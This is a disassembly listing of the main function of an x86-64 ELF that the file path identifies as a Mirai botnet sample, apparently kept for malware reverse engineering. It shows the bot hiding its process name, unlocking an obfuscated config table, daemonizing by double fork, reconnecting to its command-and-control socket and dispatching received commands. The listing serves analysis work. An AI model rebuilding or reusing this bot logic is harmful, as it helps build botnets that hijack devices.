
/Users/taogoldi/Projects/Malware/Mirai/input/094e9d6ee057d38f40c35f018488e35ab6ccd006ed261b17322e78fd5ea2c0cb.elf:	file format elf64-x86-64

Disassembly of section .text:

00000000004061c5 <main>:
  4061c5: 55                           	push	rbp
  4061c6: 48 89 e5                     	mov	rbp, rsp
  4061c9: 53                           	push	rbx
  4061ca: 48 81 ec 18 11 00 00         	sub	rsp, 0x1118
  4061d1: 89 bd 2c ef ff ff            	mov	dword ptr [rbp - 0x10d4], edi
  4061d7: 48 89 b5 20 ef ff ff         	mov	qword ptr [rbp - 0x10e0], rsi
  4061de: 48 c7 45 88 0c 2b 41 00      	mov	qword ptr [rbp - 0x78], 0x412b0c
  4061e6: be 00 00 00 00               	mov	esi, 0x0
  4061eb: bf 0d 2b 41 00               	mov	edi, 0x412b0d
  4061f0: e8 43 1c 00 00               	call	0x407e38 <access>
  4061f5: 83 f8 ff                     	cmp	eax, -0x1
  4061f8: 74 0a                        	je	0x406204 <main+0x3f>
  4061fa: 48 c7 45 88 1d 2b 41 00      	mov	qword ptr [rbp - 0x78], 0x412b1d
  406202: eb 08                        	jmp	0x40620c <main+0x47>
  406204: 48 c7 45 88 22 2b 41 00      	mov	qword ptr [rbp - 0x78], 0x412b22
  40620c: e8 f7 1c 00 00               	call	0x407f08 <geteuid>
  406211: 85 c0                        	test	eax, eax
  406213: 75 0a                        	jne	0x40621f <main+0x5a>
  406215: c7 05 85 e8 10 00 00 00 00 00	mov	dword ptr [rip + 0x10e885], 0x0 # 0x514aa4 <userID>
  40621f: 48 8b 85 20 ef ff ff         	mov	rax, qword ptr [rbp - 0x10e0]
  406226: 48 8b 00                     	mov	rax, qword ptr [rax]
  406229: 48 c7 c1 ff ff ff ff         	mov	rcx, -0x1
  406230: 48 89 85 18 ef ff ff         	mov	qword ptr [rbp - 0x10e8], rax
  406237: b8 00 00 00 00               	mov	eax, 0x0
  40623c: fc                           	cld
  40623d: 48 8b bd 18 ef ff ff         	mov	rdi, qword ptr [rbp - 0x10e8]
  406244: f2 ae                        	repne		scasb	al, byte ptr es:[rdi]
  406246: 48 89 c8                     	mov	rax, rcx
  406249: 48 f7 d0                     	not	rax
  40624c: 48 8d 50 ff                  	lea	rdx, [rax - 0x1]
  406250: 48 8b 85 20 ef ff ff         	mov	rax, qword ptr [rbp - 0x10e0]
  406257: 48 8b 00                     	mov	rax, qword ptr [rax]
  40625a: 48 89 c7                     	mov	rdi, rax
  40625d: be 0c 2b 41 00               	mov	esi, 0x412b0c
  406262: e8 bd 35 00 00               	call	0x409824 <strncpy>
  406267: 48 8b 85 20 ef ff ff         	mov	rax, qword ptr [rbp - 0x10e0]
  40626e: 48 8b 00                     	mov	rax, qword ptr [rax]
  406271: 48 89 c7                     	mov	rdi, rax
  406274: 48 8b 75 88                  	mov	rsi, qword ptr [rbp - 0x78]
  406278: b8 00 00 00 00               	mov	eax, 0x0
  40627d: e8 e6 1f 00 00               	call	0x408268 <sprintf>
  406282: 48 8b 45 88                  	mov	rax, qword ptr [rbp - 0x78]
  406286: 48 89 c6                     	mov	rsi, rax
  406289: 41 b8 00 00 00 00            	mov	r8d, 0x0
  40628f: b9 00 00 00 00               	mov	ecx, 0x0
  406294: ba 00 00 00 00               	mov	edx, 0x0
  406299: bf 0f 00 00 00               	mov	edi, 0xf
  40629e: b8 00 00 00 00               	mov	eax, 0x0
  4062a3: e8 34 1e 00 00               	call	0x4080dc <prctl>
  4062a8: bf 00 00 00 00               	mov	edi, 0x0
  4062ad: e8 02 1f 00 00               	call	0x4081b4 <time>
  4062b2: 89 c3                        	mov	ebx, eax
  4062b4: e8 77 1c 00 00               	call	0x407f30 <getpid>
  4062b9: 31 d8                        	xor	eax, ebx
  4062bb: 89 c7                        	mov	edi, eax
  4062bd: e8 1e 53 00 00               	call	0x40b5e0 <srandom>
  4062c2: bf 00 00 00 00               	mov	edi, 0x0
  4062c7: e8 e8 1e 00 00               	call	0x4081b4 <time>
  4062cc: 89 c3                        	mov	ebx, eax
  4062ce: e8 5d 1c 00 00               	call	0x407f30 <getpid>
  4062d3: 31 d8                        	xor	eax, ebx
  4062d5: 89 c7                        	mov	edi, eax
  4062d7: e8 28 a2 ff ff               	call	0x400504 <init_rand>
  4062dc: b8 00 00 00 00               	mov	eax, 0x0
  4062e1: e8 f5 fc ff ff               	call	0x405fdb <getOurIP>
  4062e6: e8 61 0e 00 00               	call	0x40714c <table_init>
  4062eb: c7 45 80 00 00 00 00         	mov	dword ptr [rbp - 0x80], 0x0
  4062f2: bf 01 00 00 00               	mov	edi, 0x1
  4062f7: e8 22 10 00 00               	call	0x40731e <table_unlock_val>
  4062fc: 48 8d 75 80                  	lea	rsi, [rbp - 0x80]
  406300: bf 01 00 00 00               	mov	edi, 0x1
  406305: e8 66 10 00 00               	call	0x407370 <table_retrieve_val>
  40630a: 48 89 45 98                  	mov	qword ptr [rbp - 0x68], rax
  40630e: 8b 45 80                     	mov	eax, dword ptr [rbp - 0x80]
  406311: 48 63 d0                     	movsxd	rdx, eax
  406314: 48 8b 75 98                  	mov	rsi, qword ptr [rbp - 0x68]
  406318: bf 01 00 00 00               	mov	edi, 0x1
  40631d: e8 c2 1e 00 00               	call	0x4081e4 <write>
  406322: ba 01 00 00 00               	mov	edx, 0x1
  406327: be 35 2b 41 00               	mov	esi, 0x412b35
  40632c: bf 01 00 00 00               	mov	edi, 0x1
  406331: e8 ae 1e 00 00               	call	0x4081e4 <write>
  406336: bf 01 00 00 00               	mov	edi, 0x1
  40633b: e8 07 10 00 00               	call	0x407347 <table_lock_val>
  406340: e8 ab a0 ff ff               	call	0x4003f0 <watchdog_maintain>
  406345: e8 72 1b 00 00               	call	0x407ebc <fork>
  40634a: 89 45 90                     	mov	dword ptr [rbp - 0x70], eax
  40634d: 83 7d 90 00                  	cmp	dword ptr [rbp - 0x70], 0x0
  406351: 74 1b                        	je	0x40636e <main+0x1a9>
  406353: 48 8d 75 84                  	lea	rsi, [rbp - 0x7c]
  406357: 8b 7d 90                     	mov	edi, dword ptr [rbp - 0x70]
  40635a: ba 00 00 00 00               	mov	edx, 0x0
  40635f: e8 78 1e 00 00               	call	0x4081dc <waitpid>
  406364: bf 00 00 00 00               	mov	edi, 0x0
  406369: e8 aa 56 00 00               	call	0x40ba18 <exit>
  40636e: 83 7d 90 00                  	cmp	dword ptr [rbp - 0x70], 0x0
  406372: 75 18                        	jne	0x40638c <main+0x1c7>
  406374: e8 43 1b 00 00               	call	0x407ebc <fork>
  406379: 89 45 94                     	mov	dword ptr [rbp - 0x6c], eax
  40637c: 83 7d 94 00                  	cmp	dword ptr [rbp - 0x6c], 0x0
  406380: 74 0a                        	je	0x40638c <main+0x1c7>
  406382: bf 00 00 00 00               	mov	edi, 0x0
  406387: e8 8c 56 00 00               	call	0x40ba18 <exit>
  40638c: be 01 00 00 00               	mov	esi, 0x1
  406391: bf 0d 00 00 00               	mov	edi, 0xd
  406396: e8 d9 3d 00 00               	call	0x40a174 <signal>
  40639b: eb 00                        	jmp	0x40639d <main+0x1d8>
  40639d: b8 00 00 00 00               	mov	eax, 0x0
  4063a2: e8 cb fa ff ff               	call	0x405e72 <initConnection>
  4063a7: 85 c0                        	test	eax, eax
  4063a9: 74 0c                        	je	0x4063b7 <main+0x1f2>
  4063ab: bf 05 00 00 00               	mov	edi, 0x5
  4063b0: e8 df 57 00 00               	call	0x40bb94 <sleep>
  4063b5: eb e6                        	jmp	0x40639d <main+0x1d8>
  4063b7: b8 00 00 00 00               	mov	eax, 0x0
  4063bc: e8 fe fd ff ff               	call	0x4061bf <getBuild>
  4063c1: 8b 3d b9 eb 10 00            	mov	edi, dword ptr [rip + 0x10ebb9] # 0x514f80 <KHcommSOCK>
  4063c7: ba 37 2b 41 00               	mov	edx, 0x412b37
  4063cc: be 3b 2b 41 00               	mov	esi, 0x412b3b
  4063d1: b8 00 00 00 00               	mov	eax, 0x0
  4063d6: e8 5d ac ff ff               	call	0x401038 <sockprintf>
  4063db: c7 45 a0 00 00 00 00         	mov	dword ptr [rbp - 0x60], 0x0
  4063e2: c7 45 a4 00 00 00 00         	mov	dword ptr [rbp - 0x5c], 0x0
  4063e9: e9 41 04 00 00               	jmp	0x40682f <main+0x66a>
  4063ee: c7 45 a4 00 00 00 00         	mov	dword ptr [rbp - 0x5c], 0x0
  4063f5: e9 24 01 00 00               	jmp	0x40651e <main+0x359>
  4063fa: 8b 45 a4                     	mov	eax, dword ptr [rbp - 0x5c]
  4063fd: 48 98                        	cdqe
  4063ff: 48 c1 e0 02                  	shl	rax, 0x2
  406403: 48 89 c2                     	mov	rdx, rax
  406406: 48 8b 05 c3 4e 11 00         	mov	rax, qword ptr [rip + 0x114ec3] # 0x51b2d0 <pids>
  40640d: 48 8d 04 02                  	lea	rax, [rdx + rax]
  406411: 8b 00                        	mov	eax, dword ptr [rax]
  406413: 89 c7                        	mov	edi, eax
  406415: ba 01 00 00 00               	mov	edx, 0x1
  40641a: be 00 00 00 00               	mov	esi, 0x0
  40641f: e8 b8 1d 00 00               	call	0x4081dc <waitpid>
  406424: 85 c0                        	test	eax, eax
  406426: 0f 8e ef 00 00 00            	jle	0x40651b <main+0x356>
  40642c: 8b 45 a4                     	mov	eax, dword ptr [rbp - 0x5c]
  40642f: ff c0                        	inc	eax
  406431: 89 45 bc                     	mov	dword ptr [rbp - 0x44], eax
  406434: eb 35                        	jmp	0x40646b <main+0x2a6>
  406436: 8b 45 bc                     	mov	eax, dword ptr [rbp - 0x44]
  406439: ff c8                        	dec	eax
  40643b: 89 c0                        	mov	eax, eax
  40643d: 48 c1 e0 02                  	shl	rax, 0x2
  406441: 48 89 c2                     	mov	rdx, rax
  406444: 48 8b 05 85 4e 11 00         	mov	rax, qword ptr [rip + 0x114e85] # 0x51b2d0 <pids>
  40644b: 48 8d 0c 02                  	lea	rcx, [rdx + rax]
  40644f: 8b 45 bc                     	mov	eax, dword ptr [rbp - 0x44]
  406452: 48 c1 e0 02                  	shl	rax, 0x2
  406456: 48 89 c2                     	mov	rdx, rax
  406459: 48 8b 05 70 4e 11 00         	mov	rax, qword ptr [rip + 0x114e70] # 0x51b2d0 <pids>
  406460: 48 8d 04 02                  	lea	rax, [rdx + rax]
  406464: 8b 00                        	mov	eax, dword ptr [rax]
  406466: 89 01                        	mov	dword ptr [rcx], eax
  406468: ff 45 bc                     	inc	dword ptr [rbp - 0x44]
  40646b: 8b 55 bc                     	mov	edx, dword ptr [rbp - 0x44]
  40646e: 48 8b 05 13 eb 10 00         	mov	rax, qword ptr [rip + 0x10eb13] # 0x514f88 <numpids>
  406475: 48 39 c2                     	cmp	rdx, rax
  406478: 72 bc                        	jb	0x406436 <main+0x271>
  40647a: 8b 45 bc                     	mov	eax, dword ptr [rbp - 0x44]
  40647d: ff c8                        	dec	eax
  40647f: 89 c0                        	mov	eax, eax
  406481: 48 c1 e0 02                  	shl	rax, 0x2
  406485: 48 89 c2                     	mov	rdx, rax
  406488: 48 8b 05 41 4e 11 00         	mov	rax, qword ptr [rip + 0x114e41] # 0x51b2d0 <pids>
  40648f: 48 8d 04 02                  	lea	rax, [rdx + rax]
  406493: c7 00 00 00 00 00            	mov	dword ptr [rax], 0x0
  406499: 48 8b 05 e8 ea 10 00         	mov	rax, qword ptr [rip + 0x10eae8] # 0x514f88 <numpids>
  4064a0: 48 ff c8                     	dec	rax
  4064a3: 48 89 05 de ea 10 00         	mov	qword ptr [rip + 0x10eade], rax # 0x514f88 <numpids>
  4064aa: 48 8b 05 d7 ea 10 00         	mov	rax, qword ptr [rip + 0x10ead7] # 0x514f88 <numpids>
  4064b1: 48 c1 e0 02                  	shl	rax, 0x2
  4064b5: 48 8d 78 04                  	lea	rdi, [rax + 0x4]
  4064b9: e8 1a 3e 00 00               	call	0x40a2d8 <malloc>
  4064be: 48 89 45 b0                  	mov	qword ptr [rbp - 0x50], rax
  4064c2: c7 45 bc 00 00 00 00         	mov	dword ptr [rbp - 0x44], 0x0
  4064c9: eb 2a                        	jmp	0x4064f5 <main+0x330>
  4064cb: 8b 45 bc                     	mov	eax, dword ptr [rbp - 0x44]
  4064ce: 48 c1 e0 02                  	shl	rax, 0x2
  4064d2: 48 89 c1                     	mov	rcx, rax
  4064d5: 48 03 4d b0                  	add	rcx, qword ptr [rbp - 0x50]
  4064d9: 8b 45 bc                     	mov	eax, dword ptr [rbp - 0x44]
  4064dc: 48 c1 e0 02                  	shl	rax, 0x2
  4064e0: 48 89 c2                     	mov	rdx, rax
  4064e3: 48 8b 05 e6 4d 11 00         	mov	rax, qword ptr [rip + 0x114de6] # 0x51b2d0 <pids>
  4064ea: 48 8d 04 02                  	lea	rax, [rdx + rax]
  4064ee: 8b 00                        	mov	eax, dword ptr [rax]
  4064f0: 89 01                        	mov	dword ptr [rcx], eax
  4064f2: ff 45 bc                     	inc	dword ptr [rbp - 0x44]
  4064f5: 8b 55 bc                     	mov	edx, dword ptr [rbp - 0x44]
  4064f8: 48 8b 05 89 ea 10 00         	mov	rax, qword ptr [rip + 0x10ea89] # 0x514f88 <numpids>
  4064ff: 48 39 c2                     	cmp	rdx, rax
  406502: 72 c7                        	jb	0x4064cb <main+0x306>
  406504: 48 8b 3d c5 4d 11 00         	mov	rdi, qword ptr [rip + 0x114dc5] # 0x51b2d0 <pids>
  40650b: e8 b7 4c 00 00               	call	0x40b1c7 <free>
  406510: 48 8b 45 b0                  	mov	rax, qword ptr [rbp - 0x50]
  406514: 48 89 05 b5 4d 11 00         	mov	qword ptr [rip + 0x114db5], rax # 0x51b2d0 <pids>
  40651b: ff 45 a4                     	inc	dword ptr [rbp - 0x5c]
  40651e: 8b 45 a4                     	mov	eax, dword ptr [rbp - 0x5c]
  406521: 48 63 d0                     	movsxd	rdx, eax
  406524: 48 8b 05 5d ea 10 00         	mov	rax, qword ptr [rip + 0x10ea5d] # 0x514f88 <numpids>
  40652b: 48 39 c2                     	cmp	rdx, rax
  40652e: 0f 82 c6 fe ff ff            	jb	0x4063fa <main+0x235>
  406534: 8b 45 a0                     	mov	eax, dword ptr [rbp - 0x60]
  406537: 48 98                        	cdqe
  406539: c6 84 05 30 ef ff ff 00      	mov	byte ptr [rbp + rax - 0x10d0], 0x0
  406541: 48 8d bd 30 ef ff ff         	lea	rdi, [rbp - 0x10d0]
  406548: e8 34 a0 ff ff               	call	0x400581 <trim>
  40654d: 48 8d 85 30 ef ff ff         	lea	rax, [rbp - 0x10d0]
  406554: 48 89 45 a8                  	mov	qword ptr [rbp - 0x58], rax
  406558: 48 8b 45 a8                  	mov	rax, qword ptr [rbp - 0x58]
  40655c: 0f b6 00                     	movzx	eax, byte ptr [rax]
  40655f: 3c 2e                        	cmp	al, 0x2e
  406561: 0f 85 c8 02 00 00            	jne	0x40682f <main+0x66a>
  406567: 48 8b 45 a8                  	mov	rax, qword ptr [rbp - 0x58]
  40656b: 48 ff c0                     	inc	rax
  40656e: 48 89 45 c0                  	mov	qword ptr [rbp - 0x40], rax
  406572: eb 04                        	jmp	0x406578 <main+0x3b3>
  406574: 48 ff 45 c0                  	inc	qword ptr [rbp - 0x40]
  406578: 48 8b 45 c0                  	mov	rax, qword ptr [rbp - 0x40]
  40657c: 0f b6 00                     	movzx	eax, byte ptr [rax]
  40657f: 3c 20                        	cmp	al, 0x20
  406581: 74 0b                        	je	0x40658e <main+0x3c9>
  406583: 48 8b 45 c0                  	mov	rax, qword ptr [rbp - 0x40]
  406587: 0f b6 00                     	movzx	eax, byte ptr [rax]
  40658a: 84 c0                        	test	al, al
  40658c: 75 e6                        	jne	0x406574 <main+0x3af>
  40658e: 48 8b 45 c0                  	mov	rax, qword ptr [rbp - 0x40]
  406592: 0f b6 00                     	movzx	eax, byte ptr [rax]
  406595: 84 c0                        	test	al, al
  406597: 0f 84 92 02 00 00            	je	0x40682f <main+0x66a>
  40659d: 48 8b 45 c0                  	mov	rax, qword ptr [rbp - 0x40]
  4065a1: c6 00 00                     	mov	byte ptr [rax], 0x0
  4065a4: 48 8b 45 a8                  	mov	rax, qword ptr [rbp - 0x58]
  4065a8: 48 ff c0                     	inc	rax
  4065ab: 48 89 45 c0                  	mov	qword ptr [rbp - 0x40], rax
  4065af: 48 8b 45 c0                  	mov	rax, qword ptr [rbp - 0x40]
  4065b3: 48 c7 c1 ff ff ff ff         	mov	rcx, -0x1
  4065ba: 48 89 85 10 ef ff ff         	mov	qword ptr [rbp - 0x10f0], rax
  4065c1: b8 00 00 00 00               	mov	eax, 0x0
  4065c6: fc                           	cld
  4065c7: 48 8b bd 10 ef ff ff         	mov	rdi, qword ptr [rbp - 0x10f0]
  4065ce: f2 ae                        	repne		scasb	al, byte ptr es:[rdi]
  4065d0: 48 89 c8                     	mov	rax, rcx
  4065d3: 48 f7 d0                     	not	rax
  4065d6: 48 ff c8                     	dec	rax
  4065d9: 48 03 45 a8                  	add	rax, qword ptr [rbp - 0x58]
  4065dd: 48 83 c0 02                  	add	rax, 0x2
  4065e1: 48 89 45 a8                  	mov	qword ptr [rbp - 0x58], rax
  4065e5: eb 34                        	jmp	0x40661b <main+0x456>
  4065e7: 48 8b 45 a8                  	mov	rax, qword ptr [rbp - 0x58]
  4065eb: 48 c7 c1 ff ff ff ff         	mov	rcx, -0x1
  4065f2: 48 89 85 08 ef ff ff         	mov	qword ptr [rbp - 0x10f8], rax
  4065f9: b8 00 00 00 00               	mov	eax, 0x0
  4065fe: fc                           	cld
  4065ff: 48 8b bd 08 ef ff ff         	mov	rdi, qword ptr [rbp - 0x10f8]
  406606: f2 ae                        	repne		scasb	al, byte ptr es:[rdi]
  406608: 48 89 c8                     	mov	rax, rcx
  40660b: 48 f7 d0                     	not	rax
  40660e: 48 ff c8                     	dec	rax
  406611: 48 03 45 a8                  	add	rax, qword ptr [rbp - 0x58]
  406615: 48 ff c8                     	dec	rax
  406618: c6 00 00                     	mov	byte ptr [rax], 0x0
  40661b: 48 8b 45 a8                  	mov	rax, qword ptr [rbp - 0x58]
  40661f: 48 c7 c1 ff ff ff ff         	mov	rcx, -0x1
  406626: 48 89 85 00 ef ff ff         	mov	qword ptr [rbp - 0x1100], rax
  40662d: b8 00 00 00 00               	mov	eax, 0x0
  406632: fc                           	cld
  406633: 48 8b bd 00 ef ff ff         	mov	rdi, qword ptr [rbp - 0x1100]
  40663a: f2 ae                        	repne		scasb	al, byte ptr es:[rdi]
  40663c: 48 89 c8                     	mov	rax, rcx
  40663f: 48 f7 d0                     	not	rax
  406642: 48 ff c8                     	dec	rax
  406645: 48 03 45 a8                  	add	rax, qword ptr [rbp - 0x58]
  406649: 48 ff c8                     	dec	rax
  40664c: 0f b6 00                     	movzx	eax, byte ptr [rax]
  40664f: 3c 0a                        	cmp	al, 0xa
  406651: 74 94                        	je	0x4065e7 <main+0x422>
  406653: 48 8b 45 a8                  	mov	rax, qword ptr [rbp - 0x58]
  406657: 48 c7 c1 ff ff ff ff         	mov	rcx, -0x1
  40665e: 48 89 85 f8 ee ff ff         	mov	qword ptr [rbp - 0x1108], rax
  406665: b8 00 00 00 00               	mov	eax, 0x0
  40666a: fc                           	cld
  40666b: 48 8b bd f8 ee ff ff         	mov	rdi, qword ptr [rbp - 0x1108]
  406672: f2 ae                        	repne		scasb	al, byte ptr es:[rdi]
  406674: 48 89 c8                     	mov	rax, rcx
  406677: 48 f7 d0                     	not	rax
  40667a: 48 ff c8                     	dec	rax
  40667d: 48 03 45 a8                  	add	rax, qword ptr [rbp - 0x58]
  406681: 48 ff c8                     	dec	rax
  406684: 0f b6 00                     	movzx	eax, byte ptr [rax]
  406687: 3c 0d                        	cmp	al, 0xd
  406689: 0f 84 58 ff ff ff            	je	0x4065e7 <main+0x422>
  40668f: 48 8b 45 a8                  	mov	rax, qword ptr [rbp - 0x58]
  406693: 48 89 45 c8                  	mov	qword ptr [rbp - 0x38], rax
  406697: eb 04                        	jmp	0x40669d <main+0x4d8>
  406699: 48 ff 45 a8                  	inc	qword ptr [rbp - 0x58]
  40669d: 48 8b 45 a8                  	mov	rax, qword ptr [rbp - 0x58]
  4066a1: 0f b6 00                     	movzx	eax, byte ptr [rax]
  4066a4: 3c 20                        	cmp	al, 0x20
  4066a6: 74 0b                        	je	0x4066b3 <main+0x4ee>
  4066a8: 48 8b 45 a8                  	mov	rax, qword ptr [rbp - 0x58]
  4066ac: 0f b6 00                     	movzx	eax, byte ptr [rax]
  4066af: 84 c0                        	test	al, al
  4066b1: 75 e6                        	jne	0x406699 <main+0x4d4>
  4066b3: 48 8b 45 a8                  	mov	rax, qword ptr [rbp - 0x58]
  4066b7: c6 00 00                     	mov	byte ptr [rax], 0x0
  4066ba: 48 ff 45 a8                  	inc	qword ptr [rbp - 0x58]
  4066be: 48 8b 45 c8                  	mov	rax, qword ptr [rbp - 0x38]
  4066c2: 48 89 45 d0                  	mov	qword ptr [rbp - 0x30], rax
  4066c6: eb 1b                        	jmp	0x4066e3 <main+0x51e>
  4066c8: 48 8b 45 d0                  	mov	rax, qword ptr [rbp - 0x30]
  4066cc: 0f b6 00                     	movzx	eax, byte ptr [rax]
  4066cf: 0f b6 f8                     	movzx	edi, al
  4066d2: e8 39 1b 00 00               	call	0x408210 <toupper>
  4066d7: 89 c2                        	mov	edx, eax
  4066d9: 48 8b 45 d0                  	mov	rax, qword ptr [rbp - 0x30]
  4066dd: 88 10                        	mov	byte ptr [rax], dl
  4066df: 48 ff 45 d0                  	inc	qword ptr [rbp - 0x30]
  4066e3: 48 8b 45 d0                  	mov	rax, qword ptr [rbp - 0x30]
  4066e7: 0f b6 00                     	movzx	eax, byte ptr [rax]
  4066ea: 84 c0                        	test	al, al
  4066ec: 75 da                        	jne	0x4066c8 <main+0x503>
  4066ee: c7 45 dc 01 00 00 00         	mov	dword ptr [rbp - 0x24], 0x1
  4066f5: 48 8b 7d a8                  	mov	rdi, qword ptr [rbp - 0x58]
  4066f9: be 43 2b 41 00               	mov	esi, 0x412b43
  4066fe: e8 15 34 00 00               	call	0x409b18 <strtok>
  406703: 48 89 45 e0                  	mov	qword ptr [rbp - 0x20], rax
  406707: 48 8b 45 c8                  	mov	rax, qword ptr [rbp - 0x38]
  40670b: 48 89 85 30 ff ff ff         	mov	qword ptr [rbp - 0xd0], rax
  406712: e9 cb 00 00 00               	jmp	0x4067e2 <main+0x61d>
  406717: 48 8b 45 e0                  	mov	rax, qword ptr [rbp - 0x20]
  40671b: 0f b6 00                     	movzx	eax, byte ptr [rax]
  40671e: 3c 0a                        	cmp	al, 0xa
  406720: 0f 84 a9 00 00 00            	je	0x4067cf <main+0x60a>
  406726: 8b 5d dc                     	mov	ebx, dword ptr [rbp - 0x24]
  406729: 48 8b 45 e0                  	mov	rax, qword ptr [rbp - 0x20]
  40672d: 48 c7 c1 ff ff ff ff         	mov	rcx, -0x1
  406734: 48 89 85 f0 ee ff ff         	mov	qword ptr [rbp - 0x1110], rax
  40673b: b8 00 00 00 00               	mov	eax, 0x0
  406740: fc                           	cld
  406741: 48 8b bd f0 ee ff ff         	mov	rdi, qword ptr [rbp - 0x1110]
  406748: f2 ae                        	repne		scasb	al, byte ptr es:[rdi]
  40674a: 48 89 c8                     	mov	rax, rcx
  40674d: 48 f7 d0                     	not	rax
  406750: 48 ff c8                     	dec	rax
  406753: 48 8d 78 01                  	lea	rdi, [rax + 0x1]
  406757: e8 7c 3b 00 00               	call	0x40a2d8 <malloc>
  40675c: 48 89 c2                     	mov	rdx, rax
  40675f: 48 63 c3                     	movsxd	rax, ebx
  406762: 48 89 94 c5 30 ff ff ff      	mov	qword ptr [rbp + 8*rax - 0xd0], rdx
  40676a: 48 8b 45 e0                  	mov	rax, qword ptr [rbp - 0x20]
  40676e: 48 c7 c1 ff ff ff ff         	mov	rcx, -0x1
  406775: 48 89 85 e8 ee ff ff         	mov	qword ptr [rbp - 0x1118], rax
  40677c: b8 00 00 00 00               	mov	eax, 0x0
  406781: fc                           	cld
  406782: 48 8b bd e8 ee ff ff         	mov	rdi, qword ptr [rbp - 0x1118]
  406789: f2 ae                        	repne		scasb	al, byte ptr es:[rdi]
  40678b: 48 89 c8                     	mov	rax, rcx
  40678e: 48 f7 d0                     	not	rax
  406791: 48 ff c8                     	dec	rax
  406794: 48 8d 50 01                  	lea	rdx, [rax + 0x1]
  406798: 8b 45 dc                     	mov	eax, dword ptr [rbp - 0x24]
  40679b: 48 98                        	cdqe
  40679d: 48 8b 84 c5 30 ff ff ff      	mov	rax, qword ptr [rbp + 8*rax - 0xd0]
  4067a5: 48 89 c7                     	mov	rdi, rax
  4067a8: fc                           	cld
  4067a9: 48 89 d1                     	mov	rcx, rdx
  4067ac: b8 00 00 00 00               	mov	eax, 0x0
  4067b1: f3 aa                        	rep		stosb	byte ptr es:[rdi], al
  4067b3: 48 8b 75 e0                  	mov	rsi, qword ptr [rbp - 0x20]
  4067b7: 8b 45 dc                     	mov	eax, dword ptr [rbp - 0x24]
  4067ba: 48 98                        	cdqe
  4067bc: 48 8b 84 c5 30 ff ff ff      	mov	rax, qword ptr [rbp + 8*rax - 0xd0]
  4067c4: 48 89 c7                     	mov	rdi, rax
  4067c7: e8 94 2e 00 00               	call	0x409660 <strcpy>
  4067cc: ff 45 dc                     	inc	dword ptr [rbp - 0x24]
  4067cf: be 43 2b 41 00               	mov	esi, 0x412b43
  4067d4: bf 00 00 00 00               	mov	edi, 0x0
  4067d9: e8 3a 33 00 00               	call	0x409b18 <strtok>
  4067de: 48 89 45 e0                  	mov	qword ptr [rbp - 0x20], rax
  4067e2: 48 83 7d e0 00               	cmp	qword ptr [rbp - 0x20], 0x0
  4067e7: 0f 85 2a ff ff ff            	jne	0x406717 <main+0x552>
  4067ed: 48 8d b5 30 ff ff ff         	lea	rsi, [rbp - 0xd0]
  4067f4: 8b 7d dc                     	mov	edi, dword ptr [rbp - 0x24]
  4067f7: e8 3c d6 ff ff               	call	0x403e38 <processCmd>
  4067fc: 83 7d dc 01                  	cmp	dword ptr [rbp - 0x24], 0x1
  406800: 7e 2d                        	jle	0x40682f <main+0x66a>
  406802: c7 45 ec 01 00 00 00         	mov	dword ptr [rbp - 0x14], 0x1
  406809: c7 45 ec 01 00 00 00         	mov	dword ptr [rbp - 0x14], 0x1
  406810: eb 15                        	jmp	0x406827 <main+0x662>
  406812: 8b 45 ec                     	mov	eax, dword ptr [rbp - 0x14]
  406815: 48 98                        	cdqe
  406817: 48 8b bc c5 30 ff ff ff      	mov	rdi, qword ptr [rbp + 8*rax - 0xd0]
  40681f: e8 a3 49 00 00               	call	0x40b1c7 <free>
  406824: ff 45 ec                     	inc	dword ptr [rbp - 0x14]
  406827: 8b 45 ec                     	mov	eax, dword ptr [rbp - 0x14]
  40682a: 3b 45 dc                     	cmp	eax, dword ptr [rbp - 0x24]
  40682d: 7c e3                        	jl	0x406812 <main+0x64d>
  40682f: 48 8d b5 30 ef ff ff         	lea	rsi, [rbp - 0x10d0]
  406836: 8b 3d 44 e7 10 00            	mov	edi, dword ptr [rip + 0x10e744] # 0x514f80 <KHcommSOCK>
  40683c: ba 00 10 00 00               	mov	edx, 0x1000
  406841: e8 d0 af ff ff               	call	0x401816 <recvLine>
  406846: 89 45 a0                     	mov	dword ptr [rbp - 0x60], eax
  406849: 83 7d a0 ff                  	cmp	dword ptr [rbp - 0x60], -0x1
  40684d: 0f 85 9b fb ff ff            	jne	0x4063ee <main+0x229>
  406853: e9 45 fb ff ff               	jmp	0x40639d <main+0x1d8>
